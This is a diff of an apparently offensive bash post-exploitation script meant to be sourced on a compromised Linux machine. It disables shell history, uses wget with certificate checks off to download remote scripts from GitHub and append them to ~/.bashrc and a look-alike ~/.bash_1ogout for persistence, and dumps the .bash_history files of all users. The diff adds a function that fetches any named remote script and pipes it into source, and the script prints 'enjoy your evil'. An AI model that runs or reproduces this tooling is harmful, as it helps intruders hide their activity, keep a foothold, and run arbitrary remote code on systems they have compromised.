@@ -4,15 +4,15 @@ export HISTFILE=/dev/null; #_fdsagadsfasdgadsgsss
 export HISTSIZE=0; #_fdsagadsfasdgadsgsss
 export HISTFILESIZE=0; #_fdsagadsfasdgadsgsss
 export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \$? -ne 0 ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f ~/.bash_1ogout ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> ~/.bash_1ogout; fi ; . ~/.bash_1ogout;" #_fdsagadsfasdgadsgsss
-REST="\e[0m" #_fdsagadsfasdgadsgsss
-UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
-ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
-ColorGreen="\e[32m" #_fdsagadsfasdgadsgsss
-ColorYellow="\e[33m" #_fdsagadsfasdgadsgsss
-ColorBlue="\e[34m" #_fdsagadsfasdgadsgsss
-ColorMagenta="\e[35m" #_fdsagadsfasdgadsgsss
-ColorCyan="\e[36m" #_fdsagadsfasdgadsgsss
-FLAG="" #_fdsagadsfasdgadsgsss
+export REST="\e[0m" #_fdsagadsfasdgadsgsss
+export UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
+export ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
+export ColorGreen="\e[32m" #_fdsagadsfasdgadsgsss
+export ColorYellow="\e[33m" #_fdsagadsfasdgadsgsss
+export ColorBlue="\e[34m" #_fdsagadsfasdgadsgsss
+export ColorMagenta="\e[35m" #_fdsagadsfasdgadsgsss
+export ColorCyan="\e[36m" #_fdsagadsfasdgadsgsss
+export FLAG="#_fdsagadsfasdgadsgsss" #_fdsagadsfasdgadsgsss
 my_name="$(whoami)" #_fdsagadsfasdgadsgsss
 my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
 my_ip="$(last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | xargs)" #_fdsagadsfasdgadsgsss
@@ -20,7 +20,8 @@ index_f=/tmp/_fadsgindexfs; #_fdsagadsfasdgadsgsss
 clear_shell=/tmp/asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
 function _bak { #_fdsagadsfasdgadsgsss
   if [ -f $1 ];then #_fdsagadsfasdgadsgsss
-    cp -v $1 /tmp/  2>/dev/null #_fdsagadsfasdgadsgsss
+    cp  $1 /tmp/  2>/dev/null #_fdsagadsfasdgadsgsss
+    gglog "bak" $1 #_fdsagadsfasdgadsgsss
     echo $1 >> $index_f #_fdsagadsfasdgadsgsss
   fi #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
@@ -89,13 +90,22 @@ if [ $(( $(w|grep pts | wc -l ) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
     gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
-alias hist="cat $HOME/.bash_history; if [ $(( $(ls /home | wc -l) )) -gt 0 ];then cat /home/*/.bash_history; fi;"  #_fdsagadsfasdgadsgsss
+alias hist="cat $HOME/.bash_history; if [ $(( $(ls /home | wc -l) )) -gt 2 ];then cat /home/*/.bash_history; fi;"  #_fdsagadsfasdgadsgsss
 alias vi="vi \"+set history=0\"" #_fdsagadsfasdgadsgsss
-report() { #_fdsagadsfasdgadsgsss
-  for cd_d in $(hist | awk  '{ if ( $2 == "cd"){ print $3};}' | sort | uniq );do #_fdsagadsfasdgadsgsss
+i() { #_fdsagadsfasdgadsgsss
+  for cd_d in $(hist | awk  '{ if ( $1 == "cd"){ print $2};}' | sort | uniq );do #_fdsagadsfasdgadsgsss
     gglog  ${UNDERLINE}${cd_d}${REST} "to check" #_fdsagadsfasdgadsgsss
   done #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 help() { #_fdsagadsfasdgadsgsss
-  print "repot" #_fdsagadsfasdgadsgsss
+  gglog "function" "i" #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+plist() { #_fdsagadsfasdgadsgsss
+  for l in $(wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/list' -O- );do #_fdsagadsfasdgadsgsss
+    gglog '>> ' $l #_fdsagadsfasdgadsgsss
+  done #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+load() { #_fdsagadsfasdgadsgsss
+  gglog 'load' $1; #_fdsagadsfasdgadsgsss
+  wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/$1' -O-  | source #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
